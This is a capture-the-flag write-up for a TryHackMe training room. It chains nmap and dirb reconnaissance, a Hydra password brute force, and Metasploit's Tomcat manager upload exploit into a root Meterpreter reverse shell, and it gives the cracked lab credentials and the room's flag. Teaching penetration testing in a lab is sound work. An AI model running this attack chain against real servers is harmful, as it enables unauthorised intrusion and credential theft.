# Room Information

Room link: https://tryhackme.com/room/toolsrus

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/01/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine
2. `nmap -sC -sV -A {TARGET-IP} > {FILENAME1}.txt` to perform an aggressive network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto our terminal
```bash
root@ip-10-10-171-134:~# nmap -sC -sV -A 10.10.199.35 > PortScan.txt
```
```bash
root@ip-10-10-171-134:~# nmap -sC -sV -A 10.10.199.35 

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-02 00:24 BST
Nmap scan report for ip-10-10-199-35.eu-west-1.compute.internal (10.10.199.35)
Host is up (0.00044s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a7:d4:d7:0b:58:01:98:ba:74:62:e9:6b:54:25:a2:47 (RSA)
|   256 a1:2b:30:2f:cc:b7:6a:ea:3d:70:71:3c:ca:92:70:ee (ECDSA)
|_  256 5d:53:08:f7:5b:b1:3a:92:2b:7c:e8:7a:be:47:4b:15 (EdDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
MAC Address: 02:FC:15:E6:68:FB (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms ip-10-10-199-35.eu-west-1.compute.internal (10.10.199.35)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds

```

#
> Scanning for Hiddent Web Directories Using Dirb
4. `dirb http://{TARGET IP} -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
5. `cat {FILENAME2}.txt` to output the scan results from the previous command onto our terminal
```bash
root@ip-10-10-171-134:~# dirb http://10.10.199.35 -r > WebDirectoryScan.txt
```
```bash
root@ip-10-10-171-134:~# cat WebDirectoryScan.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jul  1 23:40:10 2023
URL_BASE: http://10.10.199.35/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.199.35/ ----
==> DIRECTORY: http://10.10.199.35/guidelines/                                 
+ http://10.10.199.35/index.html (CODE:200|SIZE:168)                           
+ http://10.10.199.35/protected (CODE:401|SIZE:459)                            
+ http://10.10.199.35/server-status (CODE:403|SIZE:300)                        
                                                                               
-----------------
END_TIME: Sat Jul  1 23:40:12 2023
DOWNLOADED: 4612 - FOUND: 3
```

#
>
6. `firefox "http://{TARGET IP}/guidelines` to launch Firefox and redirect it to the target's **/guidelines** page, which displayed a message that contained the name of one of the target's staff members

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Guidelines.png) 

7. `firefox "http://{TARGET IP}/protected"` to launch Firefox and redirect it to the target's **/protected** web directory, which prompted us to login in order to have access to its contents

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Protected.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Protected%20(Unauthorized).png)

8. `hydra -l {USER} -P {WORDLIST PATH} http-get://{ATTACK IP}/{PROTECTED DIRECTORY}` to try to guess the password of the user that we discovered in the **/guidelines** page, which ended up working in the end 
```bash
root@ip-10-10-171-134:~# hydra -l bob -P ~/Tools/wordlists/rockyou.txt http-get://10.10.199.35/protected
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-01 23:43:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://10.10.199.35:80//protected
[80][http-get] host: 10.10.199.35   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 23:43:53
```

9. `firefox "http://{TARGET IP}/protected` to relaunch Firefox and redirect it back to the target's **/protected** page and log in using the set of credentials that we now have, but when logged in, we receive a message saying that the page has moved to a different port

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Log%20Into%20Protected.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Page%20Moved%20to%20Different%20Port.png)

10. `dirb http://{TARGET IP}:1234 -r > {FILENAME3}` to non-recursively scan the target's other web server that's running on a higher port for directories using Dirb's default wordlist and then redirecting the results into a text file
11. `cat {FILENAME3}` to output the scan results from the previous command onto our terminal
```bash
root@ip-10-10-171-134:~# dirb http://10.10.199.35:1234 -r > WebDirectoryScan2.txt
```
```bash
root@ip-10-10-171-134:~# cat WebDirectoryScan2.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jul  2 00:26:40 2023
URL_BASE: http://10.10.199.35:1234/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.199.35:1234/ ----
+ http://10.10.199.35:1234/docs (CODE:302|SIZE:0)                              
+ http://10.10.199.35:1234/examples (CODE:302|SIZE:0)                          
+ http://10.10.199.35:1234/favicon.ico (CODE:200|SIZE:21630)                   
+ http://10.10.199.35:1234/host-manager (CODE:302|SIZE:0)                      
+ http://10.10.199.35:1234/manager (CODE:302|SIZE:0)                           
                                                                               
-----------------
END_TIME: Sun Jul  2 00:26:42 2023
DOWNLOADED: 4612 - FOUND: 5
```
12. `firefox "http://{TARGET IP}:1234/manager"` to launch Firefox and redirect it to the target's Tomcat **/manager** page using the set of credentials that we previously found

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Log%20Into%20Protected.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20ToolsRus/Manager%20Logged%20In.png)

13. `nikto -id {USER:PASSWORD} -host http://{TARGET IP}:1234/manager/html` to scan for potential web vulnerabilities on the target host while focusing at uncovering potential security weaknesses that could lead to unauthaurized disclosure of sensitive data using the provided ID credentials
```bash
root@ip-10-10-171-134:~# nikto -id bob:bubbles -host http://10.10.199.35:1234/manager/html
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.199.35
+ Target Hostname:    ip-10-10-199-35.eu-west-1.compute.internal
+ Target Port:        1234
+ Start Time:         2023-07-02 00:33:50 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ Cookie JSESSIONID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ /manager/html/manager/html: Default Tomcat Manager interface found
+ /manager/html/WorkArea/version.xml: Ektron CMS version information
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-07-02 00:34:00 (GMT1) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

14. `msfconsole` to launch the Metasploit Framework on our attack machine
15. `search Apache Tomcat` to search for Apache Tomcat exploit modules, which revealed 32 exploit modules related to Apache Tomcat but the one we were really interested in was the **tomcat_mgr_upload** module
16. `info {EXPLOIT PATH}` to output more detail about the **tomcat_mgr_upload** module onto our terminal 
```bash
root@ip-10-10-171-134:~# msfconsole
                                                  

 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v6.3.24-dev-                         ]
+ -- --=[ 2329 exploits - 1218 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Save the current environment with the 
save command, future console restarts will use this 
environment again
Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
```
```bash
msf6 > search Tomcat

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank       Check  Description
   -   ----                                                            ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos                2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1   exploit/multi/http/struts_dev_mode                              2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_namespace_ognl                       2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   4   auxiliary/admin/http/tomcat_ghostcat                            2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   5   exploit/windows/http/tomcat_cgi_cmdlineargs                     2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   6   exploit/multi/http/tomcat_mgr_deploy                            2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   7   exploit/multi/http/tomcat_mgr_upload                            2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   8   auxiliary/dos/http/apache_tomcat_transfer_encoding              2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   9   auxiliary/scanner/http/tomcat_enum                                               normal     No     Apache Tomcat User Enumeration
   10  exploit/linux/local/tomcat_rhel_based_temp_priv_esc             2016-10-10       manual     Yes    Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation
   11  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc             2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
   12  exploit/multi/http/atlassian_confluence_webwork_ognl_injection  2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
   13  exploit/windows/http/cayin_xpost_sql_rce                        2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   14  exploit/multi/http/cisco_dcnm_upload_2019                       2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   15  exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec    2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
   16  exploit/linux/http/cisco_hyperflex_file_upload_rce              2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
   17  exploit/linux/http/cpi_tararchive_upload                        2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   18  exploit/linux/http/cisco_prime_inf_rce                          2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   19  post/multi/gather/tomcat_gather                                                  normal     No     Gather Tomcat Credentials
   20  auxiliary/dos/http/hashcollision_dos                            2011-12-28       normal     No     Hashtable Collisions
   21  auxiliary/admin/http/ibm_drm_download                           2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   22  exploit/linux/http/lucee_admin_imgprocess_file_write            2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
   23  exploit/linux/http/mobileiron_core_log4shell                    2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
   24  exploit/multi/http/zenworks_configuration_management_upload     2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   25  exploit/multi/http/spring_framework_rce_spring4shell            2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
   26  auxiliary/admin/http/tomcat_administration                                       normal     No     Tomcat Administration Tool Default Access
   27  auxiliary/scanner/http/tomcat_mgr_login                                          normal     No     Tomcat Application Manager Login Utility
   28  exploit/multi/http/tomcat_jsp_upload_bypass                     2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   29  auxiliary/admin/http/tomcat_utf8_traversal                      2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   30  auxiliary/admin/http/trendmicro_dlp_traversal                   2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   31  post/windows/gather/enum_tomcat                                                  normal     No     Windows Gather Apache Tomcat Enumeration


Interact with a module by name or index. For example info 31, use 31 or use post/windows/gather/enum_tomcat
```
```bash
msf6 > info exploit/multi/http/tomcat_mgr_upload 

       Name: Apache Tomcat Manager Authenticated Upload Code Execution
     Module: exploit/multi/http/tomcat_mgr_upload
   Platform: Java, Linux, Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2009-11-09

Provided by:
  rangercha

Available targets:
      Id  Name
      --  ----
  =>  0   Java Universal
      1   Windows Universal
      2   Linux x86

Check supported:
  Yes

Basic options:
  Name          Current Setting  Required  Description
  ----          ---------------  --------  -----------
  HttpPassword                   no        The password for the specified usernam
                                           e
  HttpUsername                   no        The username to authenticate as
  Proxies                        no        A proxy chain of format type:host:port
                                           [,type:host:port][...]
  RHOSTS                         yes       The target host(s), see https://docs.m
                                           etasploit.com/docs/using-metasploit/ba
                                           sics/using-metasploit.html
  RPORT         80               yes       The target port (TCP)
  SSL           false            no        Negotiate SSL/TLS for outgoing connect
                                           ions
  TARGETURI     /manager         yes       The URI path of the manager app (/html
                                           /upload and /undeploy will be used)
  VHOST                          no        HTTP server virtual host

Payload information:

Description:
  This module can be used to execute a payload on Apache Tomcat servers that
  have an exposed "manager" application. The payload is uploaded as a WAR archive
  containing a jsp application using a POST request against the /manager/html/upload
  component.

  NOTE: The compatible payload sets vary based on the selected target. For
  example, you must select the Windows target to use native Windows payloads.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2009-3843
  OSVDB (60317)
  https://nvd.nist.gov/vuln/detail/CVE-2009-4189
  OSVDB (60670)
  https://nvd.nist.gov/vuln/detail/CVE-2009-4188
  http://www.securityfocus.com/bid/38084
  https://nvd.nist.gov/vuln/detail/CVE-2010-0557
  http://www-01.ibm.com/support/docview.wss?uid=swg21419179
  https://nvd.nist.gov/vuln/detail/CVE-2010-4094
  http://www.zerodayinitiative.com/advisories/ZDI-10-214
  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
  OSVDB (60176)
  http://www.securityfocus.com/bid/36954
  http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html


View the full module info with the info -d command.
```
17. `use {EXPLOIT PATH}` to load the **tomcat_mgr_upload** for further configuration and execution
18. `show options` to display the available and required options and their current values
19. `set HttpPassword {USER'S PASSWORD}` to set the value of the **HttpPassword** variable to the user's password that we guessed using Hydra
20. `set HttpUsername {USER'S USERNAME}` to set the value of the **HttpUsername** variable to the user's name that we found in the target's **/guidelines** page
21. `set RHOSTS {TARGET IP}` to set the value of the **RHOSTS** variable to the target's IP address
22. `set RPORT 1234` to set the value of the **RPORT** variable to the port number of the web server that's running the Tomcat manager page
23. `set TARGETURI /manager` to set the value of the **TARGETURI** to the location of the target's Tomcat manager page
24. `show options` to display the available options and their new current value to ensure that everything was properly set, which it was
25. `exploit` to execute the module, which spawned in a reverse Meterpreter shell
```bash
msf6 > use exploit/multi/http/tomcat_mgr_upload 
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
```
```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified userna
                                            me
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:por
                                            t[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.
                                            metasploit.com/docs/using-metasploit/
                                            basics/using-metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connec
                                            tions
   TARGETURI     /manager         yes       The URI path of the manager app (/htm
                                            l/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.171.134    yes       The listen address (an interface may be spec
                                     ified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.
```
```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
```
```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
```
```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.199.35
RHOSTS => 10.10.199.35
```
```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
```
```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > set TARGETURI /manager
TARGETURI => /manager
```
```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  bubbles          no        The password for the specified userna
                                            me
   HttpUsername  bob              no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:por
                                            t[,type:host:port][...]
   RHOSTS        10.10.199.35     yes       The target host(s), see https://docs.
                                            metasploit.com/docs/using-metasploit/
                                            basics/using-metasploit.html
   RPORT         1234             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connec
                                            tions
   TARGETURI     /manager         yes       The URI path of the manager app (/htm
                                            l/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.171.134    yes       The listen address (an interface may be spec
                                     ified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.
```
```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.10.171.134:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying V2tEbNyLzoqZa8jZ2...
[*] Executing V2tEbNyLzoqZa8jZ2...
[*] Undeploying V2tEbNyLzoqZa8jZ2 ...
[*] Sending stage (58851 bytes) to 10.10.199.35
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 2 opened (10.10.171.134:4444 -> 10.10.199.35:34402) at 2023-07-02 01:07:57 +0100

meterpreter > 
```
26. `getuid` to retrieve the user ID of the currently compromised user on the target system that we're currently running as, which turned out to be root
27. `ls /root` to display the available files and directories in the target's **/root** directory, which contained a text file called flag
28. `cat /root/{FLAG TEXT FILE}` to display the contents of the text file we found onto our terminal, which ended up containing the flag for the final question in this challenge
```bash
meterpreter > getuid
Server username: root
```
```bash
meterpreter > ls /root
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100667/rw-rw-rwx  47    fil   2019-03-11 16:06:14 +0000  .bash_history
100667/rw-rw-rwx  3106  fil   2015-10-22 18:15:21 +0100  .bashrc
040777/rwxrwxrwx  4096  dir   2019-03-11 15:30:33 +0000  .nano
100667/rw-rw-rwx  148   fil   2015-08-17 16:30:33 +0100  .profile
040777/rwxrwxrwx  4096  dir   2019-03-10 21:52:32 +0000  .ssh
100667/rw-rw-rwx  658   fil   2019-03-11 16:05:22 +0000  .viminfo
100666/rw-rw-rw-  33    fil   2019-03-11 16:05:22 +0000  flag.txt
040776/rwxrwxrw-  4096  dir   2019-03-10 21:52:43 +0000  snap
```
```bash
meterpreter > cat /root/flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```


**Room completed!**

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20ToolsRus.png)

# Command History
1. `nmap -sC -sV -A {TARGET-IP} > {FILENAME1}.txt`
2. `cat {FILENAME1}.txt`
3. `dirb http://{TARGET IP} -r > {FILENAME2}.txt`
4. `cat {FILENAME2}.txt`
5. `firefox "http://{TARGET IP}/guidelines`
6. `firefox "http://{TARGET IP}/protected"`
7. `hydra -l {USER} -P {WORDLIST PATH} http-get://{ATTACK IP}/{PROTECTED DIRECTORY}`
8. `firefox "http://{TARGET IP}/protected`
9. `dirb http://{TARGET IP}:1234 -r > {FILENAME3}`
10. `cat {FILENAME3}`
11. `firefox "http://{TARGET IP}:1234/manager"`
12. `nikto -id {USER:PASSWORD} -host http://{TARGET IP}:1234/manager/html`
13. `msfconsole`
14. `search Apache Tomcat`
15. `info {EXPLOIT PATH}`
16. `use {EXPLOIT PATH}`
17. `show options`
18. `set HttpPassword {USER'S PASSWORD}`
19. `set HttpUsername {USER'S USERNAME}`
20. `set RHOSTS {TARGET IP}`
21. `set RPORT 1234`
22. `set TARGETURI /manager`
23. `show options`
24. `exploit`
25. `getuid`
26. `ls /root`
27. `cat /root/{FLAG TEXT FILE}`

# Dissecting Some Commands
`nmap -sC -sV -A {TARGET-IP} > {FILENAME1}.txt`
+ `-sC` enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
+ `-sV` enables version detection, which attempts to determine the sevice and version information of the open ports
+ `-A` enables a set of advanced and comprehensive scan techniques and scripts to gather more detailed information about the target system or network
+ `> {FILENAME1}.txt` redirects the results into a text file


`hydra -l {USER} -P {WORDLIST PATH} http-get://{ATTACK IP}/{PROTECTED DIRECTORY}`
+ `-l {USER}` specifies the username or user list to use during the attack
+ `-P {WORDLIST PATH}` specifies the password list or file path containing a list of passwords to attempt
+ `http-get://{ATTACK IP}/{PROTECTED DIRECTORY}` specifies the target URL where the attack will be performed


`nikto -id {USER:PASSWORD} -host http://{TARGET IP}:1234/manager/html`
+ `-id {USER:PASSWORD}` specifies the credentials to use for basic authentication
+ `-host http://{TARGET IP}:1234/manager/html` specifies the target URL to scan

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/
